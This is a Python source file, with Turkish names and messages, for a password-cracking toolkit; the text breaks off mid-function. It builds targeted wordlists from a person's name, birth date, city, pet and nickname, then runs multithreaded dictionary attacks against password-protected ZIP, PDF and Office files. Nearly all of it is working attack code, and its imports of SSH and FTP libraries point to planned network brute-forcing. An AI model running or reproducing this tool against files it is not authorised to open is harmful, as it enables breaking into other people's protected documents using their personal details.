import itertools
from datetime import datetime
import os
import subprocess
import time
import sys
from concurrent.futures import ThreadPoolExecutor
import threading
import re
import pikepdf
from tqdm import tqdm
import msoffcrypto
import io
import paramiko
import ftplib
import socket

class RenkliYazi:
    # Ana Renkler
    KIRMIZI = '\033[91m'  
    YESIL = '\033[92m'    
    SARI = '\033[93m'     
    
    # Özel Renkler
    PEMBE = '\033[95m'    
    BEYAZ = '\033[97m'    
    
    # Stil
    KALIN = '\033[1m'    
    SON = '\033[0m'      

ANSI_CURSOR_UP = "\033[A"
ANSI_CLEAR_LINE = "\033[K"

def format_sure(saniye):
    if saniye < 0: return "Hesaplanıyor..."
    if saniye < 1: return f"{saniye:.2f}sn"

    saat = int(saniye // 3600)
    dakika = int((saniye % 3600) // 60)
    kalan_saniye = int(saniye % 60)

    if saat > 0:
        return f"{saat:02d}sa {dakika:02d}dk {kalan_saniye:02d}sn"
    elif dakika > 0:
        return f"{dakika:02d}dk {kalan_saniye:02d}sn"
    else:
        return f"{kalan_saniye:02d}sn"

def get_progress_bar(progress_percent, width=30):
    filled_width = int(width * progress_percent / 100)
    bar = '█' * filled_width + '-' * (width - filled_width)
    return f"[{bar}] {progress_percent:>3}%"

class SifreOlusturucu:
    def __init__(self):
        self.sifreler = set()
        self.ozel_karakterler = ["!", "@", "#", "$", "%", "&", "*"]
        self.yillar = [str(y) for y in range(1970, datetime.now().year + 1)]
        self.common_ekler = ["123", "1234", "12345", "123456", "1", "2", "01", "02"]
        self.ad = ""
        self.soyad = ""
        self.dogum_tarihi = ""
        self.onemli_tarih = ""
        self.sehir = ""
        self.takma_ad = ""
        self.pet = ""
        self.ekstra_kelimeler = []
        self.output_file = "sifreler.txt"

    def veri_topla(self):
        print(f"{RenkliYazi.SARI}\n[*] Kişisel bilgileri girin (boş bırakmak için Enter):{RenkliYazi.SON}")
        self.ad = input(f"{RenkliYazi.PEMBE}Ad: {RenkliYazi.SON}").strip()
        self.soyad = input(f"{RenkliYazi.PEMBE}Soyad: {RenkliYazi.SON}").strip()
        self.dogum_tarihi = input(f"{RenkliYazi.PEMBE}Doğum tarihi (GG.AA.YYYY): {RenkliYazi.SON}").strip()
        self.onemli_tarih = input(f"{RenkliYazi.PEMBE}Önemli bir tarih (GG.AA.YYYY): {RenkliYazi.SON}").strip()
        self.sehir = input(f"{RenkliYazi.PEMBE}Doğum yeri/yaşadığı şehir: {RenkliYazi.SON}").strip()
        self.takma_ad = input(f"{RenkliYazi.PEMBE}Takma ad/nickname: {RenkliYazi.SON}").strip()
        self.pet = input(f"{RenkliYazi.PEMBE}Evcil hayvan adı: {RenkliYazi.SON}").strip()
        ekstra_input = input(f"{RenkliYazi.PEMBE}Ek anahtar kelimeler (virgülle ayırın): {RenkliYazi.SON}").strip()
        if ekstra_input:
            self.ekstra_kelimeler = [k.strip() for k in ekstra_input.split(",") if k.strip()]
        else:
            self.ekstra_kelimeler = []

    def tarih_manipulasyonlari(self, tarih):
        if not tarih:
            return []
        sonuclar = []
        try:
            parts = tarih.split(".")
            if len(parts) == 3:
                gun, ay, yil = parts
                if len(yil) == 4:
                    sonuclar.extend([gun+ay+yil, gun+ay+yil[2:], gun+ay, yil, yil[2:]])
                elif len(yil) == 2:
                    sonuclar.extend([gun+ay+yil, gun+ay, yil])
            elif len(parts) == 2: 
                 gun, ay = parts
                 sonuclar.append(gun+ay)
            elif len(parts) == 1 and len(tarih) == 4 and tarih.isdigit():
                sonuclar.append(tarih)
                sonuclar.append(tarih[2:])
            elif len(parts) == 1 and len(tarih) == 2 and tarih.isdigit(): 
                sonuclar.append(tarih)
        except ValueError:
            pass 
        except Exception:
            pass
        return list(set(filter(None, sonuclar)))


    def kelime_manipulasyonlari(self, kelime):
        if not kelime:
            return []
        sonuclar = [kelime]
        sonuclar.append(kelime.lower())
        sonuclar.append(kelime.upper())
        if len(kelime) > 1:
            sonuclar.append(kelime.capitalize())
        
        leet_map = {'a': '4', 'A': '4', 'e': '3', 'E': '3', 'i': '1', 'I': '1', 'o': '0', 'O': '0', 's': '5', 'S': '5', 'l': '1', 'L':'1', 't': '7', 'T':'7'}
        leet_kelime = ''.join(leet_map.get(c, c) for c in kelime)
        if leet_kelime.lower() != kelime.lower():
            sonuclar.append(leet_kelime)
        return list(set(filter(None, sonuclar)))

    def kombinasyon_olustur(self):
        temel_kelimeler = []
        inputs = [self.ad, self.soyad, self.takma_ad, self.sehir, self.pet]
        for item in inputs:
            if item: temel_kelimeler.extend(self.kelime_manipulasyonlari(item))
        
        if self.ad and self.soyad:
            temel_kelimeler.extend(self.kelime_manipulasyonlari(self.ad + self.soyad))
            temel_kelimeler.extend(self.kelime_manipulasyonlari(self.soyad + self.ad))
            if len(self.ad) > 0: temel_kelimeler.extend(self.kelime_manipulasyonlari(self.ad[0] + self.soyad))
            if len(self.soyad) > 0: temel_kelimeler.extend(self.kelime_manipulasyonlari(self.ad + self.soyad[0]))
            if len(self.ad) > 0 and len(self.soyad) > 0: temel_kelimeler.extend(self.kelime_manipulasyonlari(self.ad[0] + self.soyad[0]))

        if self.dogum_tarihi: temel_kelimeler.extend(self.tarih_manipulasyonlari(self.dogum_tarihi))
        if self.onemli_tarih: temel_kelimeler.extend(self.tarih_manipulasyonlari(self.onemli_tarih))
        
        for kelime in self.ekstra_kelimeler:
            if kelime: temel_kelimeler.extend(self.kelime_manipulasyonlari(kelime))
        
        temel_kelimeler = list(set(filter(None, [k for k in temel_kelimeler if k and len(k) > 0])))
        
        self.sifreler.update(temel_kelimeler)
        
        gecici_sifreler = set(self.sifreler)
        for kelime in temel_kelimeler:
            for yil in self.yillar:
                gecici_sifreler.add(kelime + yil)
                gecici_sifreler.add(yil + kelime)
        
        for kelime in temel_kelimeler: 
            for ek in self.common_ekler:
                gecici_sifreler.add(kelime + ek)

        tum_on_islenmis_kelimeler = list(set(temel_kelimeler + list(gecici_sifreler)))
        for kelime in tum_on_islenmis_kelimeler:
            for karakter in self.ozel_karakterler:
                gecici_sifreler.add(kelime + karakter)
                for ek_sayi in self.common_ekler:
                    gecici_sifreler.add(kelime + karakter + ek_sayi)
                    gecici_sifreler.add(kelime + ek_sayi + karakter)
        
        self.sifreler.update(gecici_sifreler)
        self.sifreler = {sifre for sifre in self.sifreler if sifre and 6 <= len(sifre) <= 24}

    def sifreleri_kaydet(self):
        if not self.sifreler:
            print(f"{RenkliYazi.SARI}[!] Kaydedilecek hiç şifre üretilmedi.{RenkliYazi.SON}")
            return False
        try:
            with open(self.output_file, "w", encoding="utf-8") as f:
                for sifre in sorted(list(self.sifreler)): 
                    f.write(f"{sifre}\n")
            print(f"{RenkliYazi.YESIL}\n[+] Toplam {len(self.sifreler)} adet potansiyel şifre oluşturuldu.{RenkliYazi.SON}")
            print(f"{RenkliYazi.YESIL}[+] Şifreler '{self.output_file}' dosyasına kaydedildi.{RenkliYazi.SON}")
            return True
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}\n[!] Hata: Şifreler kaydedilemedi - {str(e)}{RenkliYazi.SON}")
            return False

    def calistir_sifre_olusturucu(self):
        print(f"{RenkliYazi.SARI}\n--- Kişisel Bilgilerden Şifre Listesi Oluşturucu ---{RenkliYazi.SON}")
        self.veri_topla()
        print(f"{RenkliYazi.SARI}\n[*] Girilen bilgilere göre potansiyel şifreler oluşturuluyor... Lütfen bekleyin...{RenkliYazi.SON}")
        self.kombinasyon_olustur()
        self.sifreleri_kaydet()

class ArsivFormati:
    ZIP = "zip"
    RAR = "rar"
    SEVEN_ZIP = "7z"
    TAR = "tar"
    GZIP = "gz"
    BZIP2 = "bz2"
    TAR_GZ = "tar.gz"
    TAR_BZ2 = "tar.bz2"

    @staticmethod
    def get_format(dosya_adi):
        uzanti = dosya_adi.lower()
        if uzanti.endswith(".zip"): return ArsivFormati.ZIP
        elif uzanti.endswith(".rar"): return ArsivFormati.RAR
        elif uzanti.endswith(".7z"): return ArsivFormati.SEVEN_ZIP
        elif uzanti.endswith((".tgz", ".tar.gz")): return ArsivFormati.TAR_GZ
        elif uzanti.endswith((".tbz2", ".tar.bz2")): return ArsivFormati.TAR_BZ2
        elif uzanti.endswith(".tar"): return ArsivFormati.TAR
        elif uzanti.endswith(".gz"): return ArsivFormati.GZIP
        elif uzanti.endswith(".bz2"): return ArsivFormati.BZIP2
        return None

class ArsivSifreKirici:
    def __init__(self, arsiv_dosyalari, thread_sayisi=5, cikti_dosyasi=None, verbose=False):
        self.arsiv_dosyalari = arsiv_dosyalari
        self.sifre_dosyasi = "sifreler.txt"
        self.thread_sayisi = thread_sayisi
        self.cikti_dosyasi = cikti_dosyasi
        self.verbose = verbose
        self.bulunan_sifreler_genel = {}
        self.tum_sifreler_listesi = []
        self.live_lines_printed = 0
        self.NUM_LIVE_BLOCK_LINES = 4
        
        self.format_komutlari = {
            ArsivFormati.ZIP: {
                "test_cmd": ["unzip", "-qq", "-P", "{sifre}", "{arsiv}", "-d", "{temp_dir}"],
                "available": True
            },
            ArsivFormati.RAR: {
                "test_cmd": ["unrar", "x", "-p{sifre}", "{arsiv}", "{temp_dir}"],
                "available": self._check_command("unrar")
            },
            ArsivFormati.SEVEN_ZIP: {
                "test_cmd": ["7z", "x", "-p{sifre}", "{arsiv}", "-o{temp_dir}"],
                "available": self._check_command("7z")
            },
            ArsivFormati.TAR: {
                "test_cmd": ["tar", "-xf", "{arsiv}", "-C", "{temp_dir}"],
                "available": self._check_command("tar")
            },
            ArsivFormati.GZIP: {
                "test_cmd": ["gzip", "-t", "{arsiv}"],
                "available": self._check_command("gzip")
            },
            ArsivFormati.BZIP2: {
                "test_cmd": ["bzip2", "-t", "{arsiv}"],
                "available": self._check_command("bzip2")
            },
            ArsivFormati.TAR_GZ: {
                "test_cmd": ["tar", "-xzf", "{arsiv}", "-C", "{temp_dir}"],
                "available": self._check_command("tar") and self._check_command("gzip")
            },
            ArsivFormati.TAR_BZ2: {
                "test_cmd": ["tar", "-xjf", "{arsiv}", "-C", "{temp_dir}"],
                "available": self._check_command("tar") and self._check_command("bzip2")
            }
        }

    def _check_command(self, cmd):
        try:
            subprocess.run(["which", cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def _get_supported_formats(self):
        return [fmt for fmt, info in self.format_komutlari.items() if info["available"]]

    def _get_file_format(self, dosya_yolu):
        return ArsivFormati.get_format(dosya_yolu)

    def _clear_live_status_block(self):
        if not self.verbose and self.live_lines_printed > 0:
            for _ in range(self.live_lines_printed):
                sys.stdout.write(ANSI_CURSOR_UP + ANSI_CLEAR_LINE)
            sys.stdout.flush()
            self.live_lines_printed = 0

    def _print_live_status_block(self, zip_dosyasi_adi, ilerleme_yuzdesi, sifre, mevcut_denenen, toplam_sifre_sayisi, etr_str, anlik_hiz_str):
        if self.verbose:
            status_line = f"{RenkliYazi.BEYAZ}[*] {zip_dosyasi_adi} - İlerleme: %{ilerleme_yuzdesi:>3} | Deneniyor: {sifre:<25} [{mevcut_denenen}/{toplam_sifre_sayisi}]{RenkliYazi.SON}"
            print(status_line)
            return
        if self.live_lines_printed > 0:
            for _ in range(self.live_lines_printed):
                sys.stdout.write(ANSI_CURSOR_UP + ANSI_CLEAR_LINE)
        
        lines_to_print = []
        lines_to_print.append(f"{RenkliYazi.BEYAZ}Dosya: {RenkliYazi.PEMBE}{zip_dosyasi_adi}{RenkliYazi.SON}")
        lines_to_print.append(f"{RenkliYazi.BEYAZ}İlerleme: {get_progress_bar(ilerleme_yuzdesi)} {RenkliYazi.SON}")
        lines_to_print.append(f"{RenkliYazi.BEYAZ}Deneniyor: {RenkliYazi.SARI}{sifre:<25}{RenkliYazi.SON} [{mevcut_denenen}/{toplam_sifre_sayisi}]")
        lines_to_print.append(f"{RenkliYazi.BEYAZ}Hız: {RenkliYazi.PEMBE}{anlik_hiz_str:<18}{RenkliYazi.SON} ETR: {RenkliYazi.PEMBE}{etr_str}{RenkliYazi.SON}")
        
        for line in lines_to_print:
            sys.stdout.write(line + ANSI_CLEAR_LINE + "\n")
        
        self.live_lines_printed = len(lines_to_print)
        sys.stdout.flush()

    def _sifreleri_oku(self):
        if not os.path.exists(self.sifre_dosyasi):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre listesi dosyası '{self.sifre_dosyasi}' bulunamadı!{RenkliYazi.SON}")
            print(f"{RenkliYazi.SARI}[!] Lütfen önce ana menüden şifre listesi oluşturun.{RenkliYazi.SON}")
            return False
        try:
            with open(self.sifre_dosyasi, "r", encoding="utf-8") as f:
                self.tum_sifreler_listesi = [line.strip() for line in f if line.strip()]
            if not self.tum_sifreler_listesi:
                print(f"{RenkliYazi.SARI}[!] Uyarı: Şifre listesi dosyası '{self.sifre_dosyasi}' boş.{RenkliYazi.SON}")
                return False
            print(f"{RenkliYazi.SARI}[*] '{self.sifre_dosyasi}' dosyasından {len(self.tum_sifreler_listesi)} adet şifre okundu.{RenkliYazi.SON}")
            return True
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre dosyası ('{self.sifre_dosyasi}') okunurken hata oluştu: {str(e)}{RenkliYazi.SON}")
            return False

    def _zip_sifre_dene_tek_dosya(self, zip_dosyasi, sifre, deneme_bilgisi):
        if deneme_bilgisi['bulunan_sifre']:
            return

        with deneme_bilgisi['lock']:
            deneme_bilgisi['denenen_sayisi'] += 1
            mevcut_denenen = deneme_bilgisi['denenen_sayisi']
            toplam_sifre_sayisi = deneme_bilgisi['toplam_sifre']
            zip_dosyasi_adi = os.path.basename(zip_dosyasi)
            
            ilerleme_yuzdesi = min(int(mevcut_denenen / toplam_sifre_sayisi * 100), 100) if toplam_sifre_sayisi > 0 else 0
            
            etr_str = "Hesaplanıyor..."
            anlik_hiz_str = "0.00 şifre/sn"
            if mevcut_denenen > 5: # ETR ve hız için minimum deneme sayısı
                gecen_sure_dosya = time.time() - deneme_bilgisi['baslangic_zamani_dosya']
                if gecen_sure_dosya > 0.5: # ETR ve hız için minimum geçen süre (saniye)
                    hiz = mevcut_denenen / gecen_sure_dosya # şifre/saniye
                    anlik_hiz_str = f"{hiz:.2f} şifre/sn"
                    if hiz > 0:
                        kalan_sifre = toplam_sifre_sayisi - mevcut_denenen
                        tahmini_kalan_sn = kalan_sifre / hiz
                        etr_str = format_sure(tahmini_kalan_sn)
                    else:
                         etr_str = "N/A"
            
            if not self.verbose:
                 if deneme_bilgisi['denenen_sayisi'] % 5 == 0 or mevcut_denenen == toplam_sifre_sayisi or (mevcut_denenen > 5 and gecen_sure_dosya > 0.5) :
                    self._print_live_status_block(zip_dosyasi_adi, ilerleme_yuzdesi, sifre, mevcut_denenen, toplam_sifre_sayisi, etr_str, anlik_hiz_str)
            else: 
                 self._print_live_status_block(zip_dosyasi_adi, ilerleme_yuzdesi, sifre, mevcut_denenen, toplam_sifre_sayisi, "N/A", "N/A")


        temp_dir = None
        try:
            temp_dir = f"/tmp/zip_extract_temp_{os.path.basename(zip_dosyasi)}_{threading.get_ident()}"
            os.makedirs(temp_dir, exist_ok=True)
            
            cmd = ["unzip", "-qq", "-P", sifre, zip_dosyasi, "-d", temp_dir]
            result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            
            if result.returncode == 0:
                with deneme_bilgisi['lock']:
                    if not deneme_bilgisi['bulunan_sifre']:
                        deneme_bilgisi['bulunan_sifre'] = sifre
                        self.bulunan_sifreler_genel[zip_dosyasi] = sifre
                        
                        self._clear_live_status_block() 
                        
                        sys.stdout.write(ANSI_CLEAR_LINE) 
                        print(f"\n{RenkliYazi.YESIL}{RenkliYazi.KALIN}[+] ŞİFRE BULUNDU ({zip_dosyasi_adi}): {sifre}{RenkliYazi.SON}")
                        print(f"{RenkliYazi.YESIL}[+] Toplam denenen şifre sayısı (bu dosya için): {mevcut_denenen}/{toplam_sifre_sayisi}{RenkliYazi.SON}")
                        
                        if self.cikti_dosyasi:
                            try:
                                with open(self.cikti_dosyasi, "a", encoding="utf-8") as f:
                                    f.write(f"ZIP Dosyası: {zip_dosyasi}\n")
                                    f.write(f"Bulunan Şifre: {sifre}\n")
                                    f.write(f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                    f.write(f"Denenen Şifre Sayısı (bu dosya için): {mevcut_denenen}/{toplam_sifre_sayisi}\n")
                                    f.write("-" * 40 + "\n")
                            except Exception as e:
                                print(f"{RenkliYazi.KIRMIZI}[!] Çıktı dosyasına yazılırken hata: {e}{RenkliYazi.SON}")
                return True
            return False
        except subprocess.TimeoutExpired:
            if self.verbose:
                 with deneme_bilgisi['lock']: print(f"{RenkliYazi.SARI}[!] Zaman aşımı ({os.path.basename(zip_dosyasi)} - {sifre}){RenkliYazi.SON}")
            return False
        except Exception as e:
            if self.verbose:
                with deneme_bilgisi['lock']: print(f"{RenkliYazi.KIRMIZI}[!] Hata ({os.path.basename(zip_dosyasi)} - {sifre}): {str(e)}{RenkliYazi.SON}")
            return False
        finally:
            if temp_dir and os.path.exists(temp_dir):
                try:
                    subprocess.run(["rm", "-rf", temp_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                except Exception as e_rm:
                    if self.verbose: print(f"{RenkliYazi.SARI}[!] Geçici klasör ({temp_dir}) silinirken hata: {e_rm}{RenkliYazi.SON}")

    def _dosya_kontrol(self, zip_dosyasi_yolu):
        if not os.path.exists(zip_dosyasi_yolu):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: {zip_dosyasi_yolu} dosyası bulunamadı!{RenkliYazi.SON}")
            return False
        

        try:
            result = subprocess.run(["file", zip_dosyasi_yolu], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=False, timeout=5)
            if result.returncode == 0 and "Zip archive data" not in result.stdout:
                print(f"{RenkliYazi.SARI}[!] Uyarı: {zip_dosyasi_yolu} bir ZIP arşivi gibi görünmüyor (Algılanan tür: {result.stdout.strip()}). Yine de denenecek.{RenkliYazi.SON}")
            elif result.returncode != 0 and self.verbose:
                 print(f"{RenkliYazi.SARI}[!] 'file' komutuyla dosya türü belirlenirken sorun oluştu: {result.stderr.strip()}{RenkliYazi.SON}")
        except FileNotFoundError:
            if self.verbose: print(f"{RenkliYazi.SARI}[!] 'file' komutu bulunamadı. Gelişmiş dosya türü kontrolü atlanıyor.{RenkliYazi.SON}")
        except subprocess.TimeoutExpired:
            if self.verbose: print(f"{RenkliYazi.SARI}[!] 'file' komutu zaman aşımına uğradı. Gelişmiş dosya türü kontrolü atlanıyor.{RenkliYazi.SON}")
        except Exception as e:
            if self.verbose: print(f"{RenkliYazi.SARI}[!] Dosya türü kontrolü sırasında beklenmedik hata: {str(e)}{RenkliYazi.SON}")
        return True

    def kirma_baslat(self):
        if not self._sifreleri_oku():
            return 

        print(f"\n{RenkliYazi.SARI}[*] Şifre kırma işlemi için toplam {len(self.tum_sifreler_listesi)} adet şifre kullanılacak.")
        print(f"[*] Kullanılacak thread sayısı: {self.thread_sayisi}")
        print(f"[*] Ayrıntılı (verbose) mod: {'Açık' if self.verbose else 'Kapalı'}{RenkliYazi.SON}")
        if self.cikti_dosyasi:
            print(f"[*] Başarılı sonuçlar şu dosyaya yazılacak: {self.cikti_dosyasi}{RenkliYazi.SON}")

        overall_start_time = time.time()
        total_passwords_tried_overall = 0

        for zip_dosyasi_yolu in self.arsiv_dosyalari:
            self.live_lines_printed = 0
            zip_dosyasi_adi = os.path.basename(zip_dosyasi_yolu)
            
            if zip_dosyasi_yolu in self.bulunan_sifreler_genel:
                print(f"\n{RenkliYazi.SARI}[*] {zip_dosyasi_adi} için şifre daha önce bulunmuş ({self.bulunan_sifreler_genel[zip_dosyasi_yolu]}). Atlanıyor...{RenkliYazi.SON}")
                continue

            if not self._dosya_kontrol(zip_dosyasi_yolu):
                print(f"{RenkliYazi.SARI}[!] {zip_dosyasi_yolu} hatalı veya erişilemiyor. Atlanıyor...{RenkliYazi.SON}")
                continue
            
            print(f"\n{RenkliYazi.PEMBE}{RenkliYazi.KALIN}===== {zip_dosyasi_adi} İÇİN ŞİFRE KIRMA İŞLEMİ BAŞLATILIYOR ====={RenkliYazi.SON}")
            if not self.verbose: 
                 for _ in range(self.NUM_LIVE_BLOCK_LINES + 1):
                    print("")
                 self.live_lines_printed = self.NUM_LIVE_BLOCK_LINES +1 

            baslangic_zamani_dosya_kirmasi = time.time()
            deneme_bilgisi = {
                'lock': threading.Lock(), 
                'denenen_sayisi': 0, 
                'bulunan_sifre': None, 
                'toplam_sifre': len(self.tum_sifreler_listesi),
                'baslangic_zamani_dosya': baslangic_zamani_dosya_kirmasi
            }
            
            with ThreadPoolExecutor(max_workers=self.thread_sayisi) as executor:
                futures = [executor.submit(self._zip_sifre_dene_tek_dosya, zip_dosyasi_yolu, sifre, deneme_bilgisi) for sifre in self.tum_sifreler_listesi]
                for future in futures:
                    if deneme_bilgisi['bulunan_sifre']:
                        try: 
                            executor.shutdown(wait=False, cancel_futures=True)
                        except TypeError: 
                            executor.shutdown(wait=False)
                        break
            
            self._clear_live_status_block()

            bitis_zamani_dosya_kirmasi = time.time()
            gecen_sure_dosya_kirmasi = bitis_zamani_dosya_kirmasi - baslangic_zamani_dosya_kirmasi
            total_passwords_tried_overall += deneme_bilgisi['denenen_sayisi']
            
            print(f"{RenkliYazi.PEMBE}{RenkliYazi.KALIN}===== {zip_dosyasi_adi} İŞLEMİ TAMAMLANDI ====={RenkliYazi.SON}")
            print(f"[*] Toplam denenen şifre sayısı: {deneme_bilgisi['denenen_sayisi']}/{len(self.tum_sifreler_listesi)}")
            print(f"[*] İşlem süresi: {format_sure(gecen_sure_dosya_kirmasi)}{RenkliYazi.SON}")
            
            if gecen_sure_dosya_kirmasi > 0 and deneme_bilgisi['denenen_sayisi'] > 0:
                saniyede_ortalama_deneme = deneme_bilgisi['denenen_sayisi'] / gecen_sure_dosya_kirmasi
                print(f"[*] Ortalama deneme hızı: {saniyede_ortalama_deneme:.2f} şifre/saniye{RenkliYazi.SON}")

            if not deneme_bilgisi['bulunan_sifre']:
                print(f"{RenkliYazi.KIRMIZI}[!] {zip_dosyasi_adi} için doğru şifre bulunamadı.{RenkliYazi.SON}")
            print("-"*60) 
        
        overall_end_time = time.time()
        overall_duration = overall_end_time - overall_start_time

        print(f"\n{RenkliYazi.SARI}{RenkliYazi.KALIN}========== TÜM İŞLEMLERİN ÖZETİ =========={RenkliYazi.SON}")
        if self.bulunan_sifreler_genel:
            print(f"{RenkliYazi.YESIL}{RenkliYazi.KALIN}====== BULUNAN ŞİFRELER ======{RenkliYazi.SON}")
            for zip_dosyasi, sifre in self.bulunan_sifreler_genel.items():
                print(f"{RenkliYazi.YESIL}[+] {os.path.basename(zip_dosyasi)}: {sifre}{RenkliYazi.SON}")
            print(f"{RenkliYazi.YESIL}{RenkliYazi.KALIN}=============================={RenkliYazi.SON}")
        else:
            print(f"{RenkliYazi.KIRMIZI}[!] Hiçbir ZIP dosyası için şifre bulunamadı.{RenkliYazi.SON}")
        
        print(f"{RenkliYazi.SARI}[*] Toplam {len(self.arsiv_dosyalari)} adet ZIP dosyası işlendi.")
        print(f"[*] Tüm işlemler için toplam geçen süre: {format_sure(overall_duration)}{RenkliYazi.SON}")
        if overall_duration > 0 and total_passwords_tried_overall > 0:
            overall_avg_speed = total_passwords_tried_overall / overall_duration
            print(f"[*] Genel ortalama deneme hızı: {overall_avg_speed:.2f} şifre/saniye{RenkliYazi.SON}")
        print(f"{RenkliYazi.SARI}{RenkliYazi.KALIN}=========================================={RenkliYazi.SON}")

class PDFSifreKirici:
    def __init__(self, pdf_dosyasi, thread_sayisi=5):
        self.pdf_dosyasi = pdf_dosyasi
        self.thread_sayisi = thread_sayisi
        self.sifre_dosyasi = "sifreler.txt"
        self.bulunan_sifre = None
        self.tum_sifreler_listesi = []
        self.denenen_sayisi = 0
        self.toplam_sifre = 0
        self.baslangic_zamani = None
        self.lock = threading.Lock()

    def _sifreleri_oku(self):
        try:
            with open(self.sifre_dosyasi, "r", encoding="utf-8") as f:
                self.tum_sifreler_listesi = [line.strip() for line in f if line.strip()]
            self.toplam_sifre = len(self.tum_sifreler_listesi)
            print(f"{RenkliYazi.SARI}[*] '{self.sifre_dosyasi}' dosyasından {self.toplam_sifre} adet şifre okundu.{RenkliYazi.SON}")
            return True
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre dosyası ('{self.sifre_dosyasi}') okunurken hata oluştu: {str(e)}{RenkliYazi.SON}")
            return False

    def _pdf_sifre_dene(self, sifre):
        if self.bulunan_sifre:
            return

        with self.lock:
            self.denenen_sayisi += 1
            mevcut_denenen = self.denenen_sayisi
            
            if mevcut_denenen % 100 == 0 or mevcut_denenen == self.toplam_sifre:
                gecen_sure = time.time() - self.baslangic_zamani
                hiz = mevcut_denenen / gecen_sure if gecen_sure > 0 else 0
                kalan_sifre = self.toplam_sifre - mevcut_denenen
                tahmini_kalan_sure = kalan_sifre / hiz if hiz > 0 else 0
                
                print(f"\r{RenkliYazi.BEYAZ}İlerleme: {get_progress_bar(int(mevcut_denenen/self.toplam_sifre*100))} "
                      f"[{mevcut_denenen}/{self.toplam_sifre}] "
                      f"Hız: {hiz:.2f} ş/s "
                      f"ETR: {format_sure(tahmini_kalan_sure)}{RenkliYazi.SON}", end="")
                sys.stdout.flush()

        try:
            pdf = pikepdf.open(self.pdf_dosyasi, password=sifre)
            pdf.close()
            
            with self.lock:
                if not self.bulunan_sifre:
                    self.bulunan_sifre = sifre
                    print(f"\n{RenkliYazi.YESIL}[+] Şifre bulundu: {sifre}{RenkliYazi.SON}")
                    print(f"{RenkliYazi.YESIL}[+] Denenen şifre sayısı: {self.denenen_sayisi}{RenkliYazi.SON}")
            return True
        except pikepdf._qpdf.PasswordError:
            return False

    def kirmayi_baslat(self):
        if not os.path.exists(self.pdf_dosyasi):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: PDF dosyası bulunamadı: {self.pdf_dosyasi}{RenkliYazi.SON}")
            return False

        if not self._sifreleri_oku():
            return False

        print(f"{RenkliYazi.SARI}[*] PDF şifre kırma işlemi başlatılıyor...")
        print(f"[*] Hedef dosya: {self.pdf_dosyasi}")
        print(f"[*] Thread sayısı: {self.thread_sayisi}{RenkliYazi.SON}")

        self.baslangic_zamani = time.time()
        
        with ThreadPoolExecutor(max_workers=self.thread_sayisi) as executor:
            futures = [executor.submit(self._pdf_sifre_dene, sifre) for sifre in self.tum_sifreler_listesi]
            for future in futures:
                if self.bulunan_sifre:
                    executor.shutdown(wait=False)
                    break

        bitis_zamani = time.time()
        toplam_sure = bitis_zamani - self.baslangic_zamani
        
        print(f"\n{RenkliYazi.SARI}[*] İşlem tamamlandı!")
        print(f"[*] Toplam geçen süre: {format_sure(toplam_sure)}")
        if toplam_sure > 0:
            print(f"[*] Ortalama hız: {self.denenen_sayisi/toplam_sure:.2f} şifre/saniye{RenkliYazi.SON}")

        return self.bulunan_sifre is not None

class OfficeSifreKirici:
    def __init__(self, office_dosyasi, thread_sayisi=5):
        self.office_dosyasi = office_dosyasi
        self.thread_sayisi = thread_sayisi
        self.sifre_dosyasi = "sifreler.txt"
        self.bulunan_sifre = None
        self.tum_sifreler_listesi = []
        self.denenen_sayisi = 0
        self.toplam_sifre = 0
        self.baslangic_zamani = None
        self.lock = threading.Lock()

    def _sifreleri_oku(self):
        try:
            with open(self.sifre_dosyasi, "r", encoding="utf-8") as f:
                self.tum_sifreler_listesi = [line.strip() for line in f if line.strip()]
            self.toplam_sifre = len(self.tum_sifreler_listesi)
            print(f"{RenkliYazi.SARI}[*] '{self.sifre_dosyasi}' dosyasından {self.toplam_sifre} adet şifre okundu.{RenkliYazi.SON}")
            return True
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre dosyası ('{self.sifre_dosyasi}') okunurken hata oluştu: {str(e)}{RenkliYazi.SON}")
            return False

    def _office_sifre_dene(self, sifre):
        if self.bulunan_sifre:
            return

        with self.lock:
            self.denenen_sayisi += 1
            mevcut_denenen = self.denenen_sayisi
            
            if mevcut_denenen % 100 == 0 or mevcut_denenen == self.toplam_sifre:
                gecen_sure = time.time() - self.baslangic_zamani
                hiz = mevcut_denenen / gecen_sure if gecen_sure > 0 else 0
                kalan_sifre = self.toplam_sifre - mevcut_denenen
                tahmini_kalan_sure = kalan_sifre / hiz if hiz > 0 else 0
                
                print(f"\r{RenkliYazi.BEYAZ}İlerleme: {get_progress_bar(int(mevcut_denenen/self.toplam_sifre*100))} "
                      f"[{mevcut_denenen}/{self.toplam_sifre}] "
                      f"Hız: {hiz:.2f} ş/s "
                      f"ETR: {format_sure(tahmini_kalan_sure)}{RenkliYazi.SON}", end="")
                sys.stdout.flush()

        try:
            with open(self.office_dosyasi, 'rb') as f:
                office_file = msoffcrypto.OfficeFile(f)
                office_file.load_key(password=sifre)
                
                temp_buffer = io.BytesIO()
                office_file.decrypt(temp_buffer)
                
                with self.lock:
                    if not self.bulunan_sifre:
                        self.bulunan_sifre = sifre
                        print(f"\n{RenkliYazi.YESIL}[+] Şifre bulundu: {sifre}{RenkliYazi.SON}")
                        print(f"{RenkliYazi.YESIL}[+] Denenen şifre sayısı: {self.denenen_sayisi}{RenkliYazi.SON}")
                return True
        except Exception:
            return False

    def kirmayi_baslat(self):
        if not os.path.exists(self.office_dosyasi):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Office dosyası bulunamadı: {self.office_dosyasi}{RenkliYazi.SON}")
            return False

        uzanti = self.office_dosyasi.lower()
        if not any(uzanti.endswith(ext) for ext in ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']):
